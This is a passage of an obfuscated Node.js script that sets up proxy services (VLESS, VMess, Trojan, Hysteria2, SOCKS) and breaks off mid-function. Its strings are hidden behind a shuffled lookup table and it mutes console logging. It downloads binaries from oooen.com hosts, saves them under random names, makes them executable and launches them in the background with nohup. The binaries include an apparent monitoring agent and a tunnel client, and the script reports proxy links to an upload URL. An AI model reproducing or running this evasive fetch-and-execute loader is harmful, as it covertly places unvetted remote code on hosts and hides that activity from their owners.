#!/usr/bin/env node

const _0x31202f = _0x5539;
(function (_0xbdd5d3, _0x30d8fc) {
    const _0x4d7c79 = _0x5539,
        _0x26af38 = _0xbdd5d3();
    while (!![]) {
        try {
            const _0x366d10 =
                (parseInt(_0x4d7c79(0x1f6)) / 0x1) *
                    (-parseInt(_0x4d7c79(0x1e3)) / 0x2) +
                parseInt(_0x4d7c79(0x1e0)) / 0x3 +
                -parseInt(_0x4d7c79(0xfb)) / 0x4 +
                parseInt(_0x4d7c79(0x188)) / 0x5 +
                (-parseInt(_0x4d7c79(0x1d0)) / 0x6) *
                    (parseInt(_0x4d7c79(0x1be)) / 0x7) +
                parseInt(_0x4d7c79(0xf0)) / 0x8 +
                -parseInt(_0x4d7c79(0x159)) / 0x9;
            if (_0x366d10 === _0x30d8fc) break;
            else _0x26af38["push"](_0x26af38["shift"]());
        } catch (_0x1b5e4f) {
            _0x26af38["push"](_0x26af38["shift"]());
        }
    }
})(_0xa9b2, 0x5c8a5);
const http = require(_0x31202f(0x1ce)),
    axios = require("axios"),
    os = require("os"),
    fs = require("fs"),
    path = require(_0x31202f(0x1d6)),
    crypto = require("crypto"),
    { promisify } = require(_0x31202f(0x1f1)),
    { exec: execCommand, execSync } = require(_0x31202f(0x1af)),
    exec = promisify(execCommand),
    UPLOAD_URL = process.env.UPLOAD_URL || "",
    PROJECT_URL = process.env.PROJECT_URL || "",
    AUTO_ACCESS = process.env.AUTO_ACCESS || ![],
    FILE_PATH = process.env.FILE_PATH || _0x31202f(0x176),
    SUB_PATH = process.env.SUB_PATH || _0x31202f(0x17f),
    PORT = process.env.SERVER_PORT || process.env.PORT || 0xbb8,
    UUID = process.env.UUID || "09e06fb7-699d-454a-92b2-c24886bbcf23",
    NEZHA_SERVER = process.env.NEZHA_SERVER || "",
    NEZHA_PORT = process.env.NEZHA_PORT || "",
    NEZHA_KEY = process.env.NEZHA_KEY || "",
    ARGO_DOMAIN = process.env.ARGO_DOMAIN || "",
    ARGO_AUTH = process.env.ARGO_AUTH || "",
    ARGO_PORT = process.env.ARGO_PORT || 0x1f41,
    S5_PORT = process.env.S5_PORT || "",
    HY2_PORT = process.env.HY2_PORT || "",
    REALITY_PORT = process.env.REALITY_PORT || "",
    CFIP = process.env.CFIP || _0x31202f(0x1c2),
    CFPORT = process.env.CFPORT || 0x1bb,
    NAME = process.env.NAME || "",
    CHAT_ID = process.env.CHAT_ID || _0x31202f(0xf8),
    BOT_TOKEN = process.env.BOT_TOKEN || _0x31202f(0x120),
    SHOW_LOG = ![_0x31202f(0x1f3), "disable", "no"][_0x31202f(0x19c)](
        (process.env.SHOW_LOG || _0x31202f(0x18c))[_0x31202f(0x1c8)](),
    );
!SHOW_LOG &&
    ((console[_0x31202f(0x192)] = () => {}),
    (console[_0x31202f(0x1fe)] = () => {}));
function alwaysLog(_0xc4ac9d) {
    const _0xd73208 = _0x31202f;
    process[_0xd73208(0x19e)][_0xd73208(0x1b3)](_0xc4ac9d + "\x0a");
}
if (!fs[_0x31202f(0x15e)](FILE_PATH)) fs[_0x31202f(0x13a)](FILE_PATH);
else {
}
function isValidPort(_0xafb327) {
    const _0x155f23 = _0x31202f;
    try {
        if (_0xafb327 === null || _0xafb327 === undefined || _0xafb327 === "")
            return ![];
        if (
            typeof _0xafb327 === "string" &&
            _0xafb327[_0x155f23(0x1e8)]() === ""
        )
            return ![];
        const _0x40b7cc = parseInt(_0xafb327);
        if (isNaN(_0x40b7cc)) return ![];
        if (_0x40b7cc < 0x1 || _0x40b7cc > 0xffff) return ![];
        return !![];
    } catch (_0x2cffee) {
        return ![];
    }
}
function generateRandomName() {
    const _0x43d413 = _0x31202f,
        _0x5c4869 = "abcdefghijklmnopqrstuvwxyz";
    let _0x25cf32 = "";
    for (let _0x5eead6 = 0x0; _0x5eead6 < 0x6; _0x5eead6++) {
        _0x25cf32 += _0x5c4869["charAt"](
            Math[_0x43d413(0x146)](
                Math[_0x43d413(0x203)]() * _0x5c4869[_0x43d413(0x1d9)],
            ),
        );
    }
    return _0x25cf32;
}
let subContent = null,
    privateKey = "",
    publicKey = "";
const npmName = generateRandomName(),
    webName = generateRandomName(),
    botName = generateRandomName(),
    phpName = generateRandomName();
let npmPath = path[_0x31202f(0x1da)](FILE_PATH, npmName),
    phpPath = path["join"](FILE_PATH, phpName),
    webPath = path[_0x31202f(0x1da)](FILE_PATH, webName),
    botPath = path[_0x31202f(0x1da)](FILE_PATH, botName),
    subPath = path[_0x31202f(0x1da)](FILE_PATH, _0x31202f(0x16e)),
    listPath = path["join"](FILE_PATH, _0x31202f(0xf7)),
    bootLogPath = path["join"](FILE_PATH, _0x31202f(0x114)),
    configPath = path["join"](FILE_PATH, _0x31202f(0x1ca)),
    certPath = path[_0x31202f(0x155)](FILE_PATH, _0x31202f(0x196)),
    keyPath = path[_0x31202f(0x155)](FILE_PATH, _0x31202f(0xf5));
function deleteNodes() {
    const _0x41deba = _0x31202f;
    try {
        if (!UPLOAD_URL) return;
        if (!fs[_0x41deba(0x15e)](subPath)) return;
        let _0x3b42bb;
        try {
            _0x3b42bb = fs[_0x41deba(0x16d)](subPath, _0x41deba(0x117));
        } catch {
            return null;
        }
        const _0x490f89 = Buffer[_0x41deba(0x148)](_0x3b42bb, _0x41deba(0x118))[
                _0x41deba(0x1b2)
            ]("utf-8"),
            _0x48ef85 = _0x490f89[_0x41deba(0x1cf)]("\x0a")["filter"](
                (_0x1bd661) =>
                    /(vless|vmess|trojan|hysteria2|socks):\/\//["test"](
                        _0x1bd661,
                    ),
            );
        if (_0x48ef85[_0x41deba(0x1d9)] === 0x0) return;
        return (
            axios["post"](
                UPLOAD_URL + _0x41deba(0x1b1),
                JSON[_0x41deba(0x1eb)]({ nodes: _0x48ef85 }),
                { headers: { "Content-Type": "application/json" } },
            )["catch"]((_0x2bc75f) => {
                return null;
            }),
            null
        );
    } catch (_0x256b88) {
        return null;
    }
}
function cleanupOldFiles() {
    const _0xae6888 = _0x31202f;
    try {
        const _0x3be4e6 = fs[_0xae6888(0x1f2)](FILE_PATH);
        _0x3be4e6["forEach"]((_0x5b4823) => {
            const _0x24a63 = _0xae6888,
                _0x5025a0 = path[_0x24a63(0x1da)](FILE_PATH, _0x5b4823);
            try {
                const _0x3a4c50 = fs["statSync"](_0x5025a0);
                _0x3a4c50[_0x24a63(0x1f7)]() && fs[_0x24a63(0xfe)](_0x5025a0);
            } catch (_0x1d40cd) {}
        });
    } catch (_0x2a4f9a) {}
}
function generateX25519Keypair() {
    const _0x4d6ab6 = _0x31202f,
        { publicKey: _0x5dcc55, privateKey: _0x2b2a6f } =
            crypto[_0x4d6ab6(0x113)]("x25519"),
        _0x1c2431 = _0x2b2a6f[_0x4d6ab6(0x1e6)]({
            type: _0x4d6ab6(0x1d8),
            format: _0x4d6ab6(0xf9),
        })[_0x4d6ab6(0x186)](-0x20),
        _0x1d945d = _0x5dcc55["export"]({
            type: _0x4d6ab6(0x1d7),
            format: _0x4d6ab6(0xf9),
        })[_0x4d6ab6(0x186)](-0x20);
    return {
        privateKey: _0x1c2431[_0x4d6ab6(0x1b2)](_0x4d6ab6(0x18f)),
        publicKey: _0x1d945d[_0x4d6ab6(0x1b2)]("base64url"),
    };
}
function generateOrLoadKeyPair() {
    const _0x2a9724 = _0x31202f,
        _0x3e54db = path["join"](FILE_PATH, "key.txt");
    if (fs["existsSync"](_0x3e54db)) {
        const _0x2fd186 = fs["readFileSync"](_0x3e54db, "utf8"),
            _0x2965d4 = _0x2fd186[_0x2a9724(0x19f)](/PrivateKey:\s*(.*)/),
            _0x194631 = _0x2fd186[_0x2a9724(0x19f)](/PublicKey:\s*(.*)/);
        if (_0x2965d4 && _0x194631) {
            ((privateKey = _0x2965d4[0x1][_0x2a9724(0x1e8)]()),
                (publicKey = _0x194631[0x1][_0x2a9724(0x1e8)]()),
                console["log"](_0x2a9724(0x1a0), privateKey),
                console[_0x2a9724(0x192)](_0x2a9724(0x1ae), publicKey));
            return;
        }
    }
    const _0x481eef = generateX25519Keypair();
    ((privateKey = _0x481eef[_0x2a9724(0x1cb)]),
        (publicKey = _0x481eef[_0x2a9724(0x11b)]),
        fs[_0x2a9724(0x1ac)](
            _0x3e54db,
            _0x2a9724(0x12c) +
                privateKey +
                "\x0aPublicKey:\x20" +
                publicKey +
                "\x0a",
            "utf8",
        ),
        console[_0x2a9724(0x192)](_0x2a9724(0x1a0), privateKey),
        console[_0x2a9724(0x192)](_0x2a9724(0x1ae), publicKey));
}
const FALLBACK_EC_KEY =
        _0x31202f(0x1fa) +
        "BggqhkjOPQMBBw==\x0a" +
        _0x31202f(0x152) +
        _0x31202f(0x1df) +
        _0x31202f(0x18e) +
        _0x31202f(0x15c) +
        _0x31202f(0x1bb) +
        _0x31202f(0x1ef),
    FALLBACK_CERT =
        _0x31202f(0x124) +
        _0x31202f(0x1ab) +
        "EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a" +
        "MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a" +
        _0x31202f(0x145) +
        _0x31202f(0x18a) +
        _0x31202f(0x11f) +
        _0x31202f(0x13b) +
        _0x31202f(0x1f4) +
        "-----END\x20CERTIFICATE-----\x0a";
function ensureTlsCertificates(_0x4af4b0, _0x4bcf00) {
    const _0x471db7 = _0x31202f;
    if (fs[_0x471db7(0x15e)](_0x4af4b0) && fs[_0x471db7(0x15e)](_0x4bcf00))
        return;
    fs[_0x471db7(0x13a)](path[_0x471db7(0x132)](_0x4af4b0), {
        recursive: !![],
    });
    try {
        (execSync(_0x471db7(0x168), { stdio: _0x471db7(0x131) }),
            execSync(_0x471db7(0x163) + _0x4bcf00 + "\x22", {
                stdio: "ignore",
            }),
            execSync(
                _0x471db7(0x19d) +
                    _0x4bcf00 +
                    "\x22\x20-out\x20\x22" +
                    _0x4af4b0 +
                    _0x471db7(0x12b),
                { stdio: _0x471db7(0x131) },
            ));
        return;
    } catch (_0x233101) {}
    (fs[_0x471db7(0x1ac)](_0x4bcf00, FALLBACK_EC_KEY),
        fs[_0x471db7(0x1ac)](_0x4af4b0, FALLBACK_CERT));
}
function getCertificateFingerprint(_0x5c904b) {
    const _0xabf013 = _0x31202f;
    try {
        const _0x32bf02 = execSync(_0xabf013(0x107) + _0x5c904b + "\x22", {
                encoding: "utf8",
                timeout: 0xbb8,
            })[_0xabf013(0x1e8)](),
            _0x3c00f6 = _0x32bf02[_0xabf013(0x19f)](/=(.+)$/);
        if (_0x3c00f6 && _0x3c00f6[0x1])
            return _0x3c00f6[0x1][_0xabf013(0xef)]();
    } catch (_0x11de63) {}
    try {
        const _0x39bf86 = fs[_0xabf013(0x16d)](_0x5c904b, _0xabf013(0x1c3)),
            _0x14c48c = _0x39bf86["match"](
                /-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/,
            );
        if (!_0x14c48c) return "";
        const _0x467bd0 = _0x14c48c[0x1][_0xabf013(0x1ed)](/\s/g, ""),
            _0x3443ee = Buffer["from"](_0x467bd0, _0xabf013(0x118)),
            _0x251cae = crypto[_0xabf013(0x16b)](_0xabf013(0x1b8))
                [_0xabf013(0x1b7)](_0x3443ee)
                [_0xabf013(0x11a)](_0xabf013(0x165));
        return _0x251cae[_0xabf013(0x19f)](/.{2}/g)
            [_0xabf013(0x1da)](":")
            [_0xabf013(0xef)]();
    } catch (_0x50b9a8) {
        return (console[_0xabf013(0x1fe)](_0xabf013(0x136), _0x50b9a8), "");
    }
}
async function generateConfig() {
    const _0x36e867 = _0x31202f,
        _0x32edd0 = {
            log: {
                access: "/dev/null",
                error: _0x36e867(0x1fb),
                loglevel: _0x36e867(0x101),
            },
            inbounds: [
                {
                    tag: _0x36e867(0x1c4),
                    port: ARGO_PORT,
                    listen: "::",
                    protocol: _0x36e867(0x103),
                    settings: {
                        clients: [{ id: UUID, flow: _0x36e867(0xf4) }],
                        decryption: _0x36e867(0x101),
                        fallbacks: [
                            { dest: 0xbb9 },
                            { path: _0x36e867(0x166), dest: 0xbba },
                            { path: _0x36e867(0x1a2), dest: 0xbbb },
                            { path: _0x36e867(0x14a), dest: 0xbbc },
                        ],
                    },
                    streamSettings: { network: "tcp" },
                },
                {
                    tag: "vless-tcp-in",
                    port: 0xbb9,
                    listen: _0x36e867(0x1bc),
                    protocol: _0x36e867(0x103),
                    settings: { clients: [{ id: UUID }], decryption: "none" },
                    streamSettings: {
                        network: _0x36e867(0x134),
                        security: "none",
                    },
                },
                {
                    tag: _0x36e867(0x1a3),
                    port: 0xbba,
                    listen: _0x36e867(0x1bc),
                    protocol: _0x36e867(0x103),
                    settings: {
                        clients: [{ id: UUID, level: 0x0 }],
                        decryption: _0x36e867(0x101),
                    },
                    streamSettings: {
                        network: "ws",
                        security: _0x36e867(0x101),
                        wsSettings: { path: _0x36e867(0x166) },
                    },
                    sniffing: {
                        enabled: !![],
                        destOverride: [
                            _0x36e867(0x1ce),
                            "tls",
                            _0x36e867(0x1b4),
                        ],
                        metadataOnly: ![],
                    },
                },
                {
                    tag: _0x36e867(0x191),
                    port: 0xbbb,
                    listen: _0x36e867(0x1bc),
                    protocol: _0x36e867(0x1dc),
                    settings: { clients: [{ id: UUID, alterId: 0x0 }] },
                    streamSettings: {
                        network: "ws",
                        wsSettings: { path: _0x36e867(0x1a2) },
                    },
                    sniffing: {
                        enabled: !![],
                        destOverride: [
                            "http",
                            _0x36e867(0x1c7),
                            _0x36e867(0x1b4),
                        ],
                        metadataOnly: ![],
                    },
                },
                {
                    tag: _0x36e867(0x121),
                    port: 0xbbc,
                    listen: "127.0.0.1",
                    protocol: _0x36e867(0x1a7),
                    settings: { clients: [{ password: UUID }] },
                    streamSettings: {
                        network: "ws",
                        security: _0x36e867(0x101),
                        wsSettings: { path: "/trojan-argo" },
                    },
                    sniffing: {
                        enabled: !![],
                        destOverride: [
                            _0x36e867(0x1ce),
                            _0x36e867(0x1c7),
                            _0x36e867(0x1b4),
                        ],
                        metadataOnly: ![],
                    },
                },
            ],
            dns: { servers: [_0x36e867(0x183)] },
            outbounds: [
                { protocol: _0x36e867(0x14f), tag: _0x36e867(0x1e1) },
                { protocol: _0x36e867(0x1c6), tag: _0x36e867(0x1a5) },
            ],
        };
    (isValidPort(REALITY_PORT) &&
        _0x32edd0[_0x36e867(0x12f)][_0x36e867(0x1bf)]({
            tag: _0x36e867(0x12d),
            listen: "::",
            port: parseInt(REALITY_PORT),
            protocol: _0x36e867(0x103),
            settings: {
                clients: [{ id: UUID, flow: _0x36e867(0xf4) }],
                decryption: "none",
            },
            streamSettings: {
                network: _0x36e867(0x13c),
                security: _0x36e867(0xfa),
                realitySettings: {
                    show: ![],
                    dest: _0x36e867(0x106),
                    xver: 0x0,
                    serverNames: [_0x36e867(0x11c)],
                    privateKey: privateKey,
                    shortIds: [""],
                },
            },
        }),
        isValidPort(HY2_PORT) &&
            _0x32edd0[_0x36e867(0x12f)][_0x36e867(0x1bf)]({
                tag: _0x36e867(0x19a),
                listen: "::",
                port: parseInt(HY2_PORT),
                protocol: _0x36e867(0x173),
                settings: { version: 0x2, clients: [{ auth: UUID }] },
                streamSettings: {
                    network: _0x36e867(0x173),
                    hysteriaSettings: {
                        version: 0x2,
                        masquerade: {
                            type: _0x36e867(0x167),
                            url: "https://bing.com",
                        },
                    },
                    security: _0x36e867(0x1c7),
                    tlsSettings: {
                        alpn: ["h3"],
                        certificates: [
                            { certificateFile: certPath, keyFile: keyPath },
                        ],
                    },
                },
            }),
        isValidPort(S5_PORT) &&
            _0x32edd0[_0x36e867(0x12f)][_0x36e867(0x1bf)]({
                tag: _0x36e867(0x135),
                listen: "::",
                port: parseInt(S5_PORT),
                protocol: _0x36e867(0xf6),
                settings: {
                    auth: _0x36e867(0x160),
                    accounts: [
                        {
                            user: UUID[_0x36e867(0x1ff)](0x0, 0x8),
                            pass: UUID["slice"](-0xc),
                        },
                    ],
                    udp: !![],
                },
            }),
        fs[_0x36e867(0x1ac)](
            path[_0x36e867(0x1da)](FILE_PATH, _0x36e867(0x1ca)),
            JSON[_0x36e867(0x1eb)](_0x32edd0, null, 0x2),
        ));
}
function getSystemArchitecture() {
    const _0x311647 = _0x31202f,
        _0x49baa4 = os[_0x311647(0xf3)]();
    return _0x49baa4 === _0x311647(0x119) ||
        _0x49baa4 === _0x311647(0x153) ||
        _0x49baa4 === "aarch64"
        ? _0x311647(0x119)
        : "amd";
}
function _0x5539(_0x29d3c8, _0x3b8082) {
    _0x29d3c8 = _0x29d3c8 - 0xef;
    const _0xa9b2d7 = _0xa9b2();
    let _0x5539bf = _0xa9b2d7[_0x29d3c8];
    return _0x5539bf;
}
function downloadFile(_0x33205, _0x438be3, _0x2affa3) {
    const _0x3703a6 = _0x31202f,
        _0xcac4f8 = _0x33205,
        _0x822989 = _0xcac4f8 + _0x3703a6(0x100);
    !fs[_0x3703a6(0x15e)](FILE_PATH) &&
        fs[_0x3703a6(0x13a)](FILE_PATH, { recursive: !![] });
    const _0x15425e = fs[_0x3703a6(0x111)](_0x822989);
    axios({ method: "get", url: _0x438be3, responseType: _0x3703a6(0x143) })
        [_0x3703a6(0x149)]((_0x3d0330) => {
            const _0x3aacd0 = _0x3703a6;
            (_0x3d0330[_0x3aacd0(0x129)][_0x3aacd0(0x115)](_0x15425e),
                _0x15425e["on"](_0x3aacd0(0x164), () => {
                    const _0x581e86 = _0x3aacd0;
                    _0x15425e[_0x581e86(0x17e)]((_0x1d2470) => {
                        const _0x5cd852 = _0x581e86;
                        if (_0x1d2470) {
                            const _0x573b08 =
                                _0x5cd852(0x195) +
                                path["basename"](_0xcac4f8) +
                                "\x20failed:\x20" +
                                _0x1d2470[_0x5cd852(0x125)];
                            (fs[_0x5cd852(0x197)](_0x822989, () => {}),
                                console[_0x5cd852(0x1fe)](_0x573b08),
                                _0x2affa3(_0x573b08));
                            return;
                        }
                        try {
                            fs[_0x5cd852(0x10d)](_0x822989, _0xcac4f8);
                        } catch (_0x30dcb9) {
                            const _0x16c9cb =
                                _0x5cd852(0x195) +
                                path[_0x5cd852(0x1c5)](_0xcac4f8) +
                                _0x5cd852(0x1db) +
                                _0x30dcb9[_0x5cd852(0x125)];
                            (fs[_0x5cd852(0x197)](_0x822989, () => {}),
                                console[_0x5cd852(0x1fe)](_0x16c9cb),
                                _0x2affa3(_0x16c9cb));
                            return;
                        }
                        (console[_0x5cd852(0x192)](
                            _0x5cd852(0x195) +
                                path[_0x5cd852(0x1c5)](_0xcac4f8) +
                                _0x5cd852(0x17d),
                        ),
                            _0x2affa3(null, _0xcac4f8));
                    });
                }),
                _0x15425e["on"]("error", (_0x3e426a) => {
                    const _0x15083b = _0x3aacd0;
                    fs["unlink"](_0x822989, () => {});
                    const _0x5817eb =
                        _0x15083b(0x195) +
                        path[_0x15083b(0x1c5)](_0xcac4f8) +
                        _0x15083b(0x1db) +
                        _0x3e426a["message"];
                    (console[_0x15083b(0x1fe)](_0x5817eb),
                        _0x2affa3(_0x5817eb));
                }));
        })
        [_0x3703a6(0x1fc)]((_0x11e742) => {
            const _0x175cd8 = _0x3703a6;
            fs[_0x175cd8(0x197)](_0x822989, () => {});
            const _0x181aa6 =
                _0x175cd8(0x195) +
                path[_0x175cd8(0x1c5)](_0xcac4f8) +
                _0x175cd8(0x1db) +
                _0x11e742[_0x175cd8(0x125)];
            (console[_0x175cd8(0x1fe)](_0x181aa6), _0x2affa3(_0x181aa6));
        });
}
async function downloadFilesAndRun() {
    const _0x2b08a3 = _0x31202f,
        _0xb7defa = getSystemArchitecture(),
        _0x358ce4 = getFilesForArchitecture(_0xb7defa);
    if (_0x358ce4[_0x2b08a3(0x1d9)] === 0x0) {
        console[_0x2b08a3(0x192)](
            "Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture",
        );
        return;
    }
    const _0x451f31 = _0x358ce4[_0x2b08a3(0x16a)]((_0x3d1aeb) => {
        return new Promise((_0x5dffd6, _0x51bfb6) => {
            const _0x24d9ec = (_0x2855eb) => {
                const _0x23e287 = _0x5539;
                downloadFile(
                    _0x3d1aeb[_0x23e287(0x19b)],
                    _0x3d1aeb[_0x23e287(0x13e)][_0x2855eb],
                    (_0x8f977f, _0xb8f420) => {
                        const _0x492e12 = _0x23e287;
                        if (!_0x8f977f) {
                            _0x5dffd6(_0xb8f420);
                            return;
                        }
                        if (
                            _0x2855eb + 0x1 <
                            _0x3d1aeb[_0x492e12(0x13e)][_0x492e12(0x1d9)]
                        ) {
                            (console["log"](
                                _0x492e12(0x184) +
                                    path[_0x492e12(0x1c5)](
                                        _0x3d1aeb[_0x492e12(0x19b)],
                                    ) +
                                    "\x20from\x20backup\x20source",
                            ),
                                _0x24d9ec(_0x2855eb + 0x1));
                            return;
                        }
                        _0x51bfb6(_0x8f977f);
                    },
                );
            };
            _0x24d9ec(0x0);
        });
    });
    try {
        await Promise[_0x2b08a3(0x189)](_0x451f31);
    } catch (_0x2f9870) {
        console[_0x2b08a3(0x1fe)]("Error\x20downloading\x20files:", _0x2f9870);
        return;
    }
    function _0x12f899(_0x9072dd) {
        const _0x66e3f0 = 0x1fd;
        _0x9072dd["forEach"]((_0xe5b616) => {
            const _0x3c3ead = _0x5539;
            if (fs[_0x3c3ead(0x15e)](_0xe5b616))
                try {
                    (fs[_0x3c3ead(0x16c)](_0xe5b616, _0x66e3f0),
                        console[_0x3c3ead(0x192)](
                            _0x3c3ead(0xf2) +
                                _0xe5b616 +
                                ":\x20" +
                                _0x66e3f0[_0x3c3ead(0x1b2)](0x8),
                        ));
                } catch (_0x5956cc) {
                    console[_0x3c3ead(0x1fe)](
                        _0x3c3ead(0x1b6) + _0xe5b616 + ":\x20" + _0x5956cc,
                    );
                }
        });
    }
    const _0x23b82a = NEZHA_PORT
        ? [npmPath, webPath, botPath]
        : [phpPath, webPath, botPath];
    _0x12f899(_0x23b82a);
    if (NEZHA_SERVER && NEZHA_KEY) {
        if (!NEZHA_PORT) {
            const _0x12d6cf = NEZHA_SERVER["includes"](":")
                    ? NEZHA_SERVER["split"](":")[_0x2b08a3(0x138)]()
                    : "",
                _0x487ce3 = new Set([
                    "443",
                    _0x2b08a3(0x10c),
                    "2096",
                    "2087",
                    _0x2b08a3(0x1d5),
                    _0x2b08a3(0x130),
                ]),
                _0x562389 = _0x487ce3[_0x2b08a3(0x137)](_0x12d6cf)
                    ? _0x2b08a3(0x18c)
                    : "false",
                _0x2bb17d =
                    "\x0aclient_secret:\x20" +
                    NEZHA_KEY +
                    _0x2b08a3(0x102) +
                    NEZHA_SERVER +
                    _0x2b08a3(0x144) +
                    _0x562389 +
                    _0x2b08a3(0x141) +
                    UUID;
            fs[_0x2b08a3(0x1ac)](
                path["join"](FILE_PATH, "config.yaml"),
                _0x2bb17d,
            );
            const _0x40c861 =
                "nohup\x20" +
                phpPath +
                "\x20-c\x20\x22" +
                FILE_PATH +
                _0x2b08a3(0xfc);
            try {
                (await exec(_0x40c861),
                    console["log"](phpName + "\x20is\x20running"),
                    await new Promise((_0xe71ee2) =>
                        setTimeout(_0xe71ee2, 0x3e8),
                    ));
            } catch (_0x4b03c1) {
                console[_0x2b08a3(0x1fe)](_0x2b08a3(0x194) + _0x4b03c1);
            }
        } else {
            let _0x47421a = "";
            const _0x1d8909 = [
                "443",
                "8443",
                _0x2b08a3(0x147),
                _0x2b08a3(0x127),
                _0x2b08a3(0x1d5),
                _0x2b08a3(0x130),
            ];
            _0x1d8909[_0x2b08a3(0x19c)](NEZHA_PORT) &&
                (_0x47421a = _0x2b08a3(0x128));
            const _0x1f5d57 =
                _0x2b08a3(0xf1) +
                npmPath +
                _0x2b08a3(0x18b) +
                NEZHA_SERVER +
                ":" +
                NEZHA_PORT +
                _0x2b08a3(0x140) +
                NEZHA_KEY +
                "\x20" +
                _0x47421a +
                _0x2b08a3(0x139);
            try {
                (await exec(_0x1f5d57),
                    console["log"](npmName + _0x2b08a3(0x178)),
                    await new Promise((_0xe26831) =>
                        setTimeout(_0xe26831, 0x3e8),
                    ));
            } catch (_0xb68670) {
                console[_0x2b08a3(0x1fe)](_0x2b08a3(0x14d) + _0xb68670);
            }
        }
    } else
        console[_0x2b08a3(0x192)](
            "NEZHA\x20variable\x20is\x20empty,skip\x20running",
        );
    const _0x581822 =
        _0x2b08a3(0xf1) +
        webPath +
        _0x2b08a3(0x10f) +
        FILE_PATH +
        _0x2b08a3(0x17b);
    try {
        (await exec(_0x581822),
            console[_0x2b08a3(0x192)](webName + _0x2b08a3(0x178)),
            await new Promise((_0x435b5e) => setTimeout(_0x435b5e, 0x3e8)));
    } catch (_0x118583) {
        console[_0x2b08a3(0x1fe)](_0x2b08a3(0x104) + _0x118583);
    }
    if (fs["existsSync"](botPath)) {
        let _0x578451;
        if (ARGO_AUTH[_0x2b08a3(0x19f)](/^[A-Z0-9a-z=]{120,250}$/))
            _0x578451 = _0x2b08a3(0x15b) + ARGO_AUTH;
        else
            ARGO_AUTH["match"](/TunnelSecret/)
                ? (_0x578451 =
                      _0x2b08a3(0x1f9) +
                      path[_0x2b08a3(0x155)](FILE_PATH, _0x2b08a3(0x202)) +
                      _0x2b08a3(0x126))
                : (_0x578451 =
                      _0x2b08a3(0x182) +
                      path["resolve"](bootLogPath) +
                      _0x2b08a3(0x179) +
                      ARGO_PORT);
        try {
            (await exec(
                "nohup\x20\x22" +
                    path[_0x2b08a3(0x155)](botPath) +
                    "\x22\x20" +
                    _0x578451 +
                    _0x2b08a3(0xff),
            ),
                console[_0x2b08a3(0x192)](botName + _0x2b08a3(0x178)),
                await new Promise((_0x14bb5f) => setTimeout(_0x14bb5f, 0x7d0)));
        } catch (_0x4ad826) {
            console["error"](_0x2b08a3(0x17c) + _0x4ad826);
        }
    }
    await new Promise((_0x43e386) => setTimeout(_0x43e386, 0x1388));
}
function getFilesForArchitecture(_0x397581) {
    const _0x2dfceb = _0x31202f,
        _0x20c94b =
            _0x397581 === _0x2dfceb(0x119)
                ? _0x2dfceb(0x1cd)
                : "https://amd64.oooen.com",
        _0x504629 = _0x397581 === "arm" ? _0x2dfceb(0x162) : _0x2dfceb(0x14b),
        _0x1aaaa4 = [
            {
                fileName: webPath,
                fileUrls: [
                    _0x20c94b + _0x2dfceb(0x142),
                    _0x504629 + _0x2dfceb(0x142),
                ],
            },
            {
                fileName: botPath,
                fileUrls: [
                    _0x20c94b + _0x2dfceb(0x10b),
                    _0x504629 + _0x2dfceb(0x10b),
                ],
            },
        ];
    return (
        NEZHA_SERVER &&
            NEZHA_KEY &&
            (NEZHA_PORT
                ? _0x1aaaa4[_0x2dfceb(0x1c9)]({
                      fileName: npmPath,
                      fileUrls: [_0x20c94b + "/agent", _0x504629 + "/agent"],
                  })
                : _0x1aaaa4[_0x2dfceb(0x1c9)]({
                      fileName: phpPath,
                      fileUrls: [
                          _0x20c94b + "/v1",
                          _0x504629 + _0x2dfceb(0x1e7),
                      ],
                  })),
        _0x1aaaa4
    );
}
function argoType() {
    const _0xa64877 = _0x31202f;
    if (!ARGO_AUTH || !ARGO_DOMAIN) {
        console[_0xa64877(0x192)](_0xa64877(0x123));
        return;
    }
    if (ARGO_AUTH[_0xa64877(0x19c)](_0xa64877(0x18d))) {
        fs[_0xa64877(0x1ac)](
            path[_0xa64877(0x1da)](FILE_PATH, _0xa64877(0x1d4)),
            ARGO_AUTH,
        );
        const _0x3ef15c =
            _0xa64877(0x1b9) +
            ARGO_AUTH[_0xa64877(0x1cf)]("\x22")[0xb] +
            _0xa64877(0x1d3) +
            path[_0xa64877(0x1da)](FILE_PATH, "tunnel.json") +
            _0xa64877(0x14e) +
            ARGO_DOMAIN +
            _0xa64877(0x198) +
            ARGO_PORT +
            _0xa64877(0x1ba);
        fs[_0xa64877(0x1ac)](
            path[_0xa64877(0x1da)](FILE_PATH, _0xa64877(0x202)),
            _0x3ef15c,
        );
    } else console["log"](_0xa64877(0x1ea) + ARGO_PORT + _0xa64877(0x12e));
}
async function waitForQuickTunnelLog(_0x215488 = 0x7530) {
    const _0x56bd49 = _0x31202f,
        _0x1f8a5c = Date["now"]() + _0x215488;
    while (Date[_0x56bd49(0x1aa)]() < _0x1f8a5c) {
        try {
            if (fs[_0x56bd49(0x15e)](bootLogPath)) {
                const _0x32896b = fs[_0x56bd49(0x16d)](
                    bootLogPath,
                    _0x56bd49(0x117),
                );
                if (/trycloudflare\.com/["test"](_0x32896b)) return _0x32896b;
            }
        } catch (_0x120e1) {}
        await new Promise((_0x2a43fa) => setTimeout(_0x2a43fa, 0x3e8));
    }
    return "";
}
async function extractDomains() {
    const _0x1c20ce = _0x31202f;
    let _0x5b804b;
    if (ARGO_AUTH && ARGO_DOMAIN)
        ((_0x5b804b = ARGO_DOMAIN),
            console[_0x1c20ce(0x192)]("ARGO_DOMAIN:", _0x5b804b),
            await generateLinks(_0x5b804b));
    else
        try {
            const _0xde3ad6 = await waitForQuickTunnelLog(),
                _0x31bb37 = _0xde3ad6[_0x1c20ce(0x1cf)]("\x0a"),
                _0x3e48f6 = [];
            _0x31bb37[_0x1c20ce(0x112)]((_0x9abe5f) => {
                const _0x48afac = _0x1c20ce,
                    _0x52bc3c = _0x9abe5f[_0x48afac(0x19f)](
                        /https?:\/\/([^ ]*trycloudflare\.com)\/?/,
                    );
                if (_0x52bc3c) {
                    const _0x309be9 = _0x52bc3c[0x1];
                    _0x3e48f6[_0x48afac(0x1bf)](_0x309be9);
                }
            });
            if (_0x3e48f6["length"] > 0x0)
                ((_0x5b804b = _0x3e48f6[0x0]),
                    console[_0x1c20ce(0x192)](_0x1c20ce(0x1ad), _0x5b804b),
                    await generateLinks(_0x5b804b));
